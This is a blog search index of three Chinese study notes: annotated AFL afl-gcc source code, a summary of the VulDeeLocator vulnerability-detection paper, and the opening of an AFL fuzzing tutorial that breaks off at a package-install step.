<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AFL源码注释（待完成）</title>
    <link href="/2021/12/21/AFL%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A/"/>
    <url>/2021/12/21/AFL%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="1-afl-gcc"><a href="#1-afl-gcc" class="headerlink" title="1. afl-gcc"></a>1. afl-gcc</h1><ul><li><p>简单函数解释</p><blockquote><ul><li><p><strong>strrchr()</strong></p><p>char *strrchr(const char *str, int c) </p><p>在参数 <strong>str</strong> 所指向的字符串中搜索最后一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</p></li><li><p><strong>access()</strong></p><p>int access(const char* pathname, int mode);</p><p>pathname 是文件的路径名+文件名</p><p> mode：指定access的作用，取值如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined">F_OK 值为0，判断文件是否存在<br>X_OK 值为1，判断对文件是可执行权限<br>W_OK 值为2，判断对文件是否有写权限<br>R_OK 值为4，判断对文件是否有读权限<br></code></pre></td></tr></table></figure><p>返回值：成功0，失败-1</p></li></ul></blockquote></li></ul><h2 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h2><p>这个函数用来寻找<code>afl-as</code>的位置。</p><ul><li>它首先检查是否存在AFL_PATH这个环境变量，如果存在就赋值给afl_path，然后检查<code>afl_path/as</code>这个文件是否可以执行，如果可以执行，就将afl_path设置为as_path。</li><li>如果不存在AFL_PATH这个环境变量，则检查argv0，例如（”~/AFL/afl-gcc”）中是否存在’/‘，如果有就找到最后一个’/‘所在的位置，并取其前面的字符串作为dir，然后检查<code>dir/afl-as</code>这个文件是否可以执行，如果可以访问，就将dir设置为as_path</li><li>如果上述两种方式都失败，则抛出异常。</li></ul><h2 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h2><p>这个函数主要是将argv拷贝到<code>u8 **cc_params</code>中，并做必要的编辑。</p><ul><li>它首先通过ck_alloc来为cc_params分配内存，分配的长度为<code>(argc+128)*8</code>，相当大的内存了。</li><li>然后检查argv[0]里有没有’/‘，如果没有就赋值’argv[0]’到name，如果有就找到最后一个’/‘所在的位置，然后跳过这个’/‘，使name指向’/‘后面的值。</li><li>将name和afl-clang比较，如果相同，<ul><li>则设置clang_mode为1，然后设置环境变量CLANG_ENV_VAR为1。</li><li>然后将name和afl-clang++比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang++</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang</li></ul></li></ul></li><li>如果不相同，则将name和afl-g++比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为g++</li><li>还比了下gcj，一般用不到</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为gcc</li></ul></li><li>然后遍历从argv[1]开始的argv参数<ul><li>跳过<code>-B/integrated-as/-pipe</code></li><li>如果存在<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，就设置asan_set为1;</li><li>如果存在<code>FORTIFY_SOURCE</code>，则设置fortify_set为1</li><li><code>cc_params[cc_par_cnt++] = cur</code>;</li></ul></li><li>然后开始设置其他的cc_params参数<ul><li>取之前计算出来的<code>as_path</code>，然后设置<code>-B as_path</code></li><li>如果是clang_mode,则设置<code>-no-integrated-as</code></li><li>如果存在AFL_HARDEN环境变量，则设置<code>-fstack-protector-all</code></li><li>sanitizer<ul><li>if如果asan_set在上面被设置为1，则使<code>AFL_USE_ASAN</code>环境变量为1</li><li>elseif存在AFL_USE_ASAN环境变量，则设置<code>-fsanitize=address</code></li><li>elseif如果存在AFL_USE_MSAN环境变量，则设置<code>-fsanitize=memory</code>，但不能同时还指定<code>AFL_HARDEN</code>或者<code>AFL_USE_ASAN</code>，因为这样运行时速度过慢。</li></ul></li><li>如果不存在AFL_DONT_OPTIMIZE环境变量，则设置<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li><li>如果存在AFL_NO_BUILTIN环境变量，则设置<code>-fno-builtin-strcmp</code>等</li></ul></li><li>最后<code>cc_params[cc_par_cnt] = NULL;</code>终止对cc_params的编辑</li></ul><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>看到这里，我们就知道afl-gcc就是找到as所在的位置，将其加入搜索路径，然后设置必要的gcc参数和一些宏，然后调用gcc进行实际的编译，仅仅只是一层wrapper</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Main entry point */</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>        SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        ...<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//查找fake GNU assembler</span><br>    find_as(argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// 设置CC的参数</span><br>    edit_params(argc, argv);<br>    <span class="hljs-comment">// 调用execvp来执行CC</span><br>    <br>    <span class="hljs-comment">// 这里我们在CC之前打印一下参数看看。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cc_params); i++) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\targ%d: %s &quot;</span>,i,cc_params[i]);<br>    &#125;<br><br>    execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-keyword">char</span> **) cc_params);<br><br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>通过在执行execvp之前打印命令行参数得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> /tmp/hello.c -B /root/src/afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b -g -O<span class="hljs-number">3</span> -funroll-loops -D__AFL_COMPILER=<span class="hljs-number">1</span> -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以看到，<code>afl-gcc</code>最终调用<code>gcc</code>，并定义了一些宏，设置了一些参数。其中最关键的就是<code>-B /root/src/afl-2.52b</code>这条。根据<code>gcc --help</code>可知，<code>-B</code>选项用于设置编译器的搜索路径，这里便是设置成<code>/root/src/afl-2.52b</code>(是我设置的环境变量<code>AFL_PATH</code>的值，即AFL目录，因为我没有make install)。</p><p>如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-&gt;”汇编代码”-&gt;”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是<code>as</code>。不过，编译完成AFL后，在其目录下也会存在一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。所以，如果通过<code>-B</code>选项为gcc设置了搜索路径，那么<code>afl-as</code>便会作为汇编器，执行实际的汇编操作。</p><p>所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过<code>afl-as</code>完成。</p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记:《VulDeeLocator:A Deep Learning-based Fine-grained Vulnerability Detector》</title>
    <link href="/2021/12/21/VulDeelLocator/"/>
    <url>/2021/12/21/VulDeelLocator/</url>
    
    <content type="html"><![CDATA[<h1 id="一vuldeellocator基本思想">一、VulDeelLocator基本思想</h1><figure><img src="/2021/12/21/VulDeelLocator/image-20211221111025076.png" alt="image-20211221111025076"><figcaption aria-hidden="true">image-20211221111025076</figcaption></figure><p>VulDeeLocator的<strong>基本思想</strong>是充分利用<strong>程序分析</strong>和<strong>深度学习</strong>技术:</p><ul><li>通过利用程序分析技术生成漏洞候选，</li><li>并使用深度学习技术“消除”程序分析技术产生的误报。</li></ul><p>具体来说，</p><ul><li>VulDeeLocator根据一组给定的漏洞语法特征，从程序源代码中提取一些标记(例如，标识符、操作符、常量和关键字)，</li><li>然后利用同一程序的中间代码来容纳中间代码中在语义上与这些标记相关的语句。</li><li>这些语句被编码成向量(然后用于训练神经网络)，或者作为训练后的神经网络的输入，用于漏洞检测。</li><li>测试阶段的输出比相应的输入粒度更细(例如，更短或更小)。</li></ul><p>图1说明了这些基本思想，显示了在测试阶段，d'中间代码语句的输入会导致两个源代码语句的精炼输出，表明漏洞在哪里。</p><figure><img src="/2021/12/21/VulDeelLocator/image-20211215140844637.png" alt="image-20211215140844637"><figcaption aria-hidden="true">image-20211215140844637</figcaption></figure><h1 id="二概述">二、概述</h1><p>漏洞很直观地展示了一些语法特征，可以利用这些特征来识别一些代码片段(即程序切片)作为漏洞检测的初始候选项。</p><h2 id="基础定义">2.1 基础定义</h2><ul><li><p><strong>定义一：</strong><code>sSyVC</code>(source code- and Syntax-based Vulnerability Candidate)：<strong>基于源代码和语法的漏洞候选</strong></p><p>给定一个源程序P和一组漏洞语法特征H= {h1，…， hη}，一个<code>sSyVC</code> y<sub>i</sub>是P中的一个或多个连续符号(例如，标识符、操作符、常量和关键字)，它们匹配某些漏洞语法特征hq(1≤ q≤η).</p></li><li><p><strong>定义二：</strong><code>iSeVC</code> (intermediate code- and Semantics-based Vulnerability Candidate)：<strong>基于中间代码和语义的漏洞候选</strong></p><p>给定一个源程序P，它的中间代码是P'，和P的一个<code>sSyVC</code> y<sub>i</sub>，用y<sub>i</sub>'表示<code>sSyVC</code> y<sub>i</sub>的中间代码。与sSyVC yi对应的iSeVC，用ei表示，是中间代码P‘中的语句序列;这些语句是依赖于y<sub>i</sub>’的数据或控制。</p><p>即<code>sSyVC</code> yi对应的<code>iSeVC</code>是程序P中间代码中的y<sub>i</sub>‘的程序切片。</p></li></ul><h2 id="vuldeelocator结构">2.2 VulDeeLocator结构</h2><figure><img src="/2021/12/21/VulDeelLocator/image-20211215145019213.png" alt="VulDeeLocator结构图"><figcaption aria-hidden="true">VulDeeLocator结构图</figcaption></figure><p>上图显示了<strong>VulDeeLocator的结构</strong>，它可以用特定的中间代码表示和深度学习模型来完成实例化。</p><p>VulDeeLocator的<strong>输入</strong>是用于学习神经网络的培训程序的源代码或用于漏洞检测的目标程序。</p><ul><li><p>更具体地说，学习阶段的输入包括C程序的源代码，这些源代码可能有漏洞，也可能没有。</p></li><li><p>C程序的源代码应满足以下条件:</p><ul><li><p>(i)它们可以编译成(平台无关的)中间代码，如LLVM中间代码;</p></li><li><p>(ii)漏洞程序具有对其漏洞位置的描述，这些描述将被用来定位目标程序中的漏洞。</p></li></ul></li></ul><p>VulDeeLocator有<strong>两个组件</strong>。</p><ul><li>第一个组件(<strong>基于中间代码的漏洞候选表示</strong>)利用训练程序和目标程序的中间代码表示，如下所示:<ul><li><strong>步骤I:</strong> 从源代码中提取<code>sSyVCs</code>，即带有一些漏洞语法特征的代码片段。</li><li><strong>步骤II:</strong> 根据<code>sSyVCs</code>从中间代码生成<code>iSeVCs</code>。</li></ul></li><li>第二个组件(<strong>细粒度的漏洞检测</strong>)使用中间代码表示来检测和定位漏洞， 如下所示:<ul><li><strong>步骤III:</strong> 标记从训练项目中提取的<code>iSeVCs</code>是否存在漏洞和存在漏洞的位置。</li><li><strong>步骤IV: </strong>从<code>iSeVCs</code>及其标签的向量表示训练一个神经网络模型。</li><li><strong>步骤V:</strong> 使用经过训练的神经网络模型检测和定位目标程序中的漏洞。</li></ul></li></ul><p>学习阶段对应步骤I-IV，测试(即检测)阶段对应步骤I、II和V</p><h1 id="三基于中间代码的漏洞候选表示">三、基于中间代码的漏洞候选表示</h1><h2 id="漏洞候选表示的指导原则">3.1 漏洞候选表示的指导原则</h2><ul><li><p><strong>原则1:</strong></p><p>适应<strong>跨文件</strong>的语义相关的程序语句。有些文件可能依赖于其他文件，例如，在一个文件中使用或引用的变量可能在另一个文件中定义。有效的漏洞候选表示应该适应这种定义-使用关系。</p></li><li><p><strong>原则2:</strong></p><p>适应<strong>跨函数</strong>的语义相关的程序语句。语义相关的语句可能会超出函数的边界，这意味着有效的漏洞候选表示应该适应并进一步保持那些语义相关语句的顺序，即使它们属于不同的函数。</p></li></ul><h2 id="提取ssyvcs">3.2 提取sSyVCs</h2><p>如上所述，<code>sSyVC</code>是根据某些漏洞语法特征从程序中提取的一段代码。</p><p>获取漏洞语法特征用于漏洞检测的方法可能有很多。作为一个具体的例子，作者利用已知漏洞的语法特征，并通过程序源代码的抽象语法树(AST树)表示这些特征(更准确地说，是AST上节点的属性)。这将简化根据漏洞语法特征提取<code>sSyVCs</code>的过程。</p><p>作者定义了以下四种<strong>漏洞语法特征</strong>。</p><ul><li>库/API函数调用(Library/API Function Call,FC):这个漏洞语法特征是AST上的节点类型是函数调用，函数名匹配库/API函数名，函数调用至少有一个参数是变量。</li><li>数组定义(Array Definition,AD):该漏洞语法特征是AST上的节点类型是变量声明，节点对应的代码包含字符'['和']'。</li><li>指针定义(Array Definition,PD):该漏洞语法特征是AST上的节点类型是变量声明，且该节点对应的代码包含字符“∗”。</li><li>算术表达式(Arithmetic Expression,AE):这个漏洞语法特征是AST上的节点类型是赋值表达式，该节点在赋值表达式的右边至少有一个变量。</li></ul><p>给定一个程序的源代码，可以生成它的AST，通过识别其类型和代码匹配某些漏洞语法特征的节点，可以从中提取sSyVCs。当然这些语法特征本身在检测漏洞方面远远不够，因为它们不能容纳与漏洞相关的适当语义信息。</p><h2 id="生成isevcs">3.3 生成iSeVCs</h2><p>与上述原则相对应的是，生成<code>iSeVCs</code>有三个组件:</p><ul><li><p>生成链接的IR文件(Intermediate Representation);</p></li><li><p>生成<code>sSyVCs</code>对应的IR切片;</p></li><li><p>并生成<code>iSeVCs</code>。</p></li></ul><p>附录中的算法1提供了生成<code>iSeVC</code>的详细信息。</p><h3 id="生成链接的ir文件---原则1">生成链接的IR文件---(原则1)。</h3><p>该组件从源程序生成一个或多个链接的IR文件，如下所示:</p><ul><li><ol type="i"><li>使用编译器(如Clang)为每个源文件生成一个IR文件;</li></ol></li><li><ol start="2" type="i"><li>根据IR文件的依赖关系链接它们，导致一个或多个IR文件链接。</li></ol></li></ul><p>图4(b)说明了使用示例<code>sSyVC</code> “data”的LLVM中间代码的想法，该示例属于图4(a)中描述的源程序的第2行。作者使用LLVM IR。具体来说，作者使用Clang编译器生成LLVM位码文件，然后根据它们的依赖关系将它们链接起来。</p><h3 id="生成对应于ssyvc的ir切片并生成isevcs---原则2">生成对应于sSyVC的IR切片并生成iSeVCs---(原则2)。</h3><p>给定一个<code>sSyVC</code>，我们可以生成相应的IR切片如下:</p><ul><li><ol type="i"><li>通过从链接的IR文件中提取控制和数据依赖来生成一个依赖图;</li></ol></li><li><ol start="2" type="i"><li>根据每个<code>sSyVC</code>对依赖图进行切片，这可以通过dg等工具来完成。</li></ol></li></ul><p>图4(c)描绘了上述<code>sSyVC</code>“data”对应的LLVM IR切片。每个局部变量用前缀%的数字值表示;对于LLVM IR片中的每个函数，第一个局部变量的数字值为1，然后对于后续的每个局部变量，值增加1。</p><p>给定IR片，我们生成如下<code>iSeVCs</code>。对于函数fα调用的每个函数fγ，函数fγ的IR切片中的语句被附加到调用函数fγ的语句(在函数fα中)。这是为了保持可能属于<strong>不同函数但彼此相关</strong>(根据控件和/或数据依赖性)的语句的顺序。如果有一个循环序列的函数调用(例如,fγ调用fα然后fα调用fγ,然后fγ调用fα,fα调用fγ,等等),我们只考虑第一个循环(也就是说,γ调用fα然后α调用fγ但不是任何进一步的),以避免无限循环。</p><p>为了避免在不同函数的IR片中将相同的数值赋给不同的局部变量，在附加语句中将局部变量的每个数值修改为一个未赋值的新数值。图4(d)说明了函数printLine的LLVM IR切片中的语句(用虚线框突出显示)被添加到调用函数main的语句“call void <span class="citation" data-cites="printLine">@printLine</span>()”中。在printLine函数的LLVM IR切片中，局部变量“%1”被修改为“%20”，因为“19”是main函数中最后赋值的数值，如图4(c)所示。</p><figure><img src="/2021/12/21/VulDeelLocator/image-20211215155227554.png" alt="image-20211215155227554"><figcaption aria-hidden="true">image-20211215155227554</figcaption></figure><h1 id="四细粒度的漏洞检测">四、细粒度的漏洞检测</h1><h2 id="细粒度漏洞检测器的需求">4.1 细粒度漏洞检测器的需求</h2><p>作者对神经网络模型提出以下三个要求，以检测和定位漏洞。</p><ul><li><p><strong>需求1:细化粒度。</strong></p><p>代码的粒度决定了用于分析的源代码的单位，其范围可以从组件的最粗粒度、到文件、到功能、到代码片段、到语句，以及到令牌的最细粒度。细化粒度对于确定漏洞或精确地识别易受攻击的代码行至关重要，这些代码行对应于语句中的粒度。这是因为漏洞检测器的输入是<code>iSeVC</code>，它对应于代码片段中的粗粒度，这意味着漏洞检测器输出的粒度要比输入的粒度细。</p></li><li><p><strong>需求2:易于映射。</strong></p><p>应该很容易将神经网络的输出(以精确的粒度)映射回<code>iSeVC</code>，以查明漏洞。输出应该是一个标记序列，其中一个或多个连续的标记对应中间代码中的同一行代码。这些中间代码行可以很容易地映射回<code>iSeVC</code>，因此也可以映射回源程序中易受攻击的代码行。</p></li><li><p><strong>需求3:注意力。</strong></p><p>注意力的概念借用自深度学习，对应于学习者应该关注的输入的重要部分;从技术上讲，注意力是通过在神经网络中适当地分配权重来实现的(即，更多的注意力意味着更高的权重)。对于一个脆弱的<code>iSeVC</code>，很可能只有一个或几个语句是脆弱的，而其他的则不是，这意味着脆弱的语句比非脆弱的语句更“重要”，因此应该被给予更高的权重。</p></li></ul><h2 id="标记isevcs">4.2 标记iSeVCs</h2><p>对训练项目中的<code>iSeVC</code>进行如下标记:如果<code>iSeVC</code>包含一个已知的漏洞，<code>iSeVC</code>将被标记为<code>iSeVC</code>中漏洞的行号(即漏洞的位置)，用x<sub>1</sub>，…， x<sub>ζ</sub>表示xi(1 ≤ i ≤ ζ)为漏洞对应的行号;否则，<code>iSeVC</code>被标记为“0”(即不包含漏洞)。</p><h2 id="训练神经网络模型">4.3 训练神经网络模型</h2><p>每个iSeVC需要被编码成一个向量，用作神经网络的输入。</p><p>由于得到的向量的长度可能不同，而神经网络以固定长度的θ为输入向量，这些向量可能需要进行如下调整:如果向量短于θ，则在向量的末端填充零;如果一个向量比θ长，则该向量被截断为长度θ，使sSyVC出现在结果向量[17]的中间。</p><h3 id="brnns双向循环神经网络实现简单的映射">4.2.1 BRNNs(双向循环神经网络)实现简单的映射</h3><p>BLSTM (Bidirectional LSTM)、BGRU (Bidirectional GRU)等BRNNs确实能够实现简单的映射，同时又能包容前后语句。</p><p>BRNNs不能实现另外两个需求，因为它们的输出粒度与输入粒度相同(而不是细化输入粒度)，它们平等地对待输入的每个部分。但是对于漏洞检测，iSeVC的某些部分(即脆弱的代码行)可能比iSeVC的其他部分更重要，应该由神经网络予以更多的关注。</p><h3 id="brnn-vdl-brnn的一种新变体进一步实现了注意力获取和粒度细化">4.2.2 BRNN-vdl: BRNN的一种新变体，进一步实现了注意力获取和粒度细化</h3><p>图5突出了BRNN-vdl的结构，该结构扩展了标准BRNN，增加了三层，制定了“vdl”部分，以实现粒度细化和注意力获取。BRNN-vdl的输入包括</p><ul><li>(i)表示iSeVCs的向量，以及</li><li>(ii)表示每个向量中漏洞位置的漏洞位置矩阵。</li></ul><p>学习阶段输出带有微调参数的BRNN-vdl。</p><figure><img src="/2021/12/21/VulDeelLocator/image-20211221103429273.png" alt="image-20211221103429273"><figcaption aria-hidden="true">image-20211221103429273</figcaption></figure><blockquote><p>BRNN-vdl向BRNN扩展了三个额外的层(即， the multiply, κ-max pooling, and average pooling layers)，这些层形成了“vdl”部分，以实现三个期望的属性。</p></blockquote><p>接下来，我们简要回顾一下BRNN，然后描述我们介绍的BRNN-vdl中的三个额外层。</p><h4 id="brnn-vdl中brnn组件的概述">BRNN-vdl中BRNN组件的概述</h4><p>如图5所示,标准BRNN具有</p><ul><li><p>(i)<strong>大量的BRNN层</strong>,用来在前后两个方向连接RNN(循环神经网络)细胞(例如,LSTM和GNU)</p></li><li><p>(ii)<strong>致密层</strong>(dense layer),减少从BRNN层接收到的向量的维数</p></li><li><p>(3)<strong>激活层</strong>(activa-tion layer),它使用激活函数在一个时间步中生成输出。</p><p>在本文的背景下，输入是代表带标签的<code>iSeVC</code>的向量。每个时间步骤对应于<code>iSeVC</code>中的一个令牌。在时间步长τ时，其中1≤τ≤λ， λ为每个<code>iSeVC</code>中的标记数，则<code>iSeVC</code> e<sub>i</sub>的BRNN层输出被表示为g<sub>τ</sub> (e<sub>i</sub>) <span class="math display">\[g_τ (e_i) =φ(g_τ−1(e_i), g_τ+1(e_i), e_i,ω,β)\]</span></p><p>其中ω为权重向量，β为偏差向量，g<sub>τ−1</sub>(ei)和g<sub>τ+1</sub>(ei)分别为BRNN层在时间阶长τ−1和τ+1时的输出，函数φ表示BRNN层的输出由其参数g<sub>τ−1</sub>(e<sub>i</sub>)、g<sub>τ+1</sub>(e<sub>i</sub>)、e<sub>i</sub>、ω和β表示。这些参数如何相互作用取决于RNN细胞，如LSTM和GRU。对于iSeVC ei，标准BRNN Ai的输出向量(即激活层的输出向量)表示为 <span class="math display">\[A_i = (g_1(e_i), . . . , g_λ(e_i))\]</span></p></li></ul><h4 id="乘法层multiply-layer实现注意力获取">乘法层(multiply layer)实现注意力获取</h4><p>为了使神经网络能够预测漏洞位置,乘法层需要根据漏洞代码行对应的令牌位置对不同的<code>iSeVCs</code>进行不同的处理。</p><ul><li>(i)对于易受攻击的<code>iSeVCs</code>，乘法层意味着选择与易受攻击的代码行对应的令牌的输出。这些被选中的输出将在后续的层和BRNN-vdl的反向传播过程中使用，因为它们将有助于以更高的精度定位漏洞(相对于不使用这个乘法层来说)。</li><li>(ii)对于不脆弱的<code>iSeVCs</code>，乘法层是指选择token的所有输出，并在后续的层和BRNN-vdl的反向传播过程中使用它们，因为这些token在学习阶段同样重要。</li></ul><p>形式上，对于<code>iSeVC</code> e<sub>i</sub>，乘层将激活层A<sub>i</sub>的输出向量与漏洞位置矩阵L<sub>i</sub>相乘。</p><p><span class="math display">\[M_i = A_iL_i\]</span> 其中，L<sub>i</sub>是一个对角矩阵，L<sub>i</sub>= diag(α<sub>1</sub>， α<sub>2</sub>，…,α<sub>λ</sub>)。对于脆弱的<code>iSeVC</code>，我们用<span class="math inline">\(x_\epsilon&#39;\)</span>表示脆弱行<span class="math inline">\(x_\epsilon\)</span>中第一个令牌的位置(1≤<span class="math inline">\(\epsilon\)</span>≤ζ)，<span class="math inline">\(w_\epsilon\)</span>表示<span class="math inline">\(x_\epsilon\)</span>中令牌的数量。</p><p>其中，α<sub>φ</sub>(1≤φ≤λ)取值如下: 对于易受攻击的<code>iSeVC</code>,如果φ∈{<span class="math inline">\(x_\epsilon&#39;\)</span>……, <span class="math inline">\(x_\epsilon&#39;\)</span>+ <span class="math inline">\(w_\epsilon-1\)</span>}，然后我们设置α<sub>φ</sub> = 1;否则，我们设置α φ = 0。对于不脆弱的<code>iSeVC</code>，我们设置α<sub>φ</sub> = 1(1≤φ≤λ)。</p><h4 id="κ-max汇聚层和平均汇聚层共同实现粒度细化">κ-max汇聚层和平均汇聚层共同实现粒度细化。</h4><blockquote><p>κ-max pooling, and average pooling layers</p></blockquote><p>为了使用反向传播训练神经网络，需要κ-max pooling层和average pooling层对multiply层的输出进行选择和处理。κ-max pooling层选取Mi层输出向量中各元素的κ最大值。平均pooling层计算κ-max pooling层输出的平均值。直观地说，这两层一起实现了粒度细化，</p><p>有两个原因：</p><ul><li>(i)它们进一步选择multiply层的输出，以获得对应于每个<code>iSeVC</code>的输出，用于反向传播，</li><li>(ii)它们同时考虑了最大值和平均值。</li></ul><p>在形式上，对于<code>iSeVC</code> ei，average pooling层o<sub>i</sub>的输出定义为 <span class="math display">\[o_i =  ave(max_κ(M_i))\]</span> 其中函数max<sub>κ</sub>返回向量中k最大的元素，函数ave返回k最大元素的平均值。训练过程经过反复的向前和向后传播，收敛为一个参数经过微调的BRNN-vdl，对训练数据中的漏洞模式进行编码。</p><h2 id="检测和定位漏洞">4.4 检测和定位漏洞</h2><p>图6突出显示了使用学习后的BRNN-vdl检测和定位目标程序中的漏洞。</p><p>输入是表示从目标程序中提取的<code>iSeVC</code>的向量。我们首先得到<code>iSeVCs</code>中标记对应的激活层的输出，然后计算每一行标记的κ最大输出值的平均值。然后，我们提取输出大于阈值ϑ的代码行，从而导致容易受到攻击的<code>iSeVC</code>和代码行。最后，我们将易受攻击的<code>iSeVC</code>和其中易受攻击的代码行映射到源代码中，作为检测阶段的输出。</p><p>以图4(d)中的<code>iSeVC</code>为例。<code>iSeVC</code>对应的向量是学习后的BRNNvdl神经网络的输入。计算每行标记的κ最大输出值的平均值后，<code>iSeVC</code>被确定为脆弱的，中间代码的脆弱行在图4(d)的19-21行。最后，将<code>iSeVC</code>中的脆弱行映射到源代码中的脆弱行(即图4(a)中的第25行)。</p><figure><img src="/2021/12/21/VulDeelLocator/image-20211221102530200.png" alt="image-20211221102530200"><figcaption aria-hidden="true">image-20211221102530200</figcaption></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL学习小记</title>
    <link href="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <url>/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="一、AFL简介"><a href="#一、AFL简介" class="headerlink" title="一、AFL简介"></a>一、AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha? Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p><p>③将队列中的文件按一定的策略进行“突变”；</p><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201143448119.png" alt="image-20211201143448119"></p><h1 id="二、AFL简单测试"><a href="#二、AFL简单测试" class="headerlink" title="二、AFL简单测试"></a>二、AFL简单测试</h1><p>这部分采用<a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101</a>提供的练习进行快速熟悉AFL的基本操作</p><h2 id="获取fuzz目标"><a href="#获取fuzz目标" class="headerlink" title="获取fuzz目标"></a>获取fuzz目标</h2><p>创建一个文件夹用来存放fuzz目标（xpdf)</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> <span class="hljs-variable">$HOME</span><br><span class="hljs-keyword">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-keyword">cd</span> fuzzing_xpdf/<br></code></pre></td></tr></table></figure><p>安装开发必要的软件包，build-essential包含gcc、g++等开发必要的包</p><blockquote><p>具体包括</p><p>dpkg-dev fakeroot g++ g++-4.6 libalgorithm-diff-perl<br>libalgorithm-diff-xs-perl libalgorithm-merge-perl<br>libdpkg-perl libstdc++6-4.6-dev libtimedate-perl</p></blockquote><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> 